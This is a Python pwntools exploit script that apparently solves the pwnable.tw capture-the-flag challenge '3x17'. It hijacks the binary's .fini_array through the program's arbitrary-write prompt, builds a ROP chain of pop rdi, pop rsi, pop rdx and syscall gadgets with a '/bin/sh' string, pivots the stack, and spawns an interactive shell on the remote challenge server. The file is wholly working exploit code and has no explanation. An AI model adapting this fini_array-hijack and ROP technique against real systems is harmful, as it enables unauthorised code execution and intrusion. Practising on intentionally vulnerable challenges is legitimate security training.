#!/usr/bin/env python3

from pwn import *

exe = ELF("./3x17")


context.binary = exe


#r = process([exe.path])
r = remote("chall.pwnable.tw", 10105)

#gdb.attach(r, gdbscript='''
#	b*0x402960
#	c
#	''')

#input()

fini_array = 0x4b40f0
main = 0x401B6D
sub_402960 = 0x402960 #fini array caller
bin_sh = 0x4b4400 


# gadget
leave_ret = 0x401c4b
pop_rax = 0x41e4af
pop_rdi = 0x401696
pop_rsi = 0x406c30
pop_rdx = 0x446e35
ret = 0x43e1c1
syscall = 0x4022b4

def my_write(addr, data):
	r.sendlineafter(b'addr:', str(addr).encode())
	r.sendlineafter(b'data:', data)
## Stage 1
my_write(fini_array, p64(sub_402960)+p64(main))
my_write(fini_array+3*8, p64(pop_rdi)+p64(fini_array+11*8))
my_write(fini_array+5*8, p64(pop_rsi)+p64(0))
my_write(fini_array+7*8, p64(pop_rdx)+p64(0))
my_write(fini_array+9*8, p64(ret)+p64(syscall))
my_write(fini_array+11*8, b"/bin/sh\x00")

## Stage 2
my_write(fini_array, p64(leave_ret)+p64(pop_rax)+p64(59))

r.interactive()
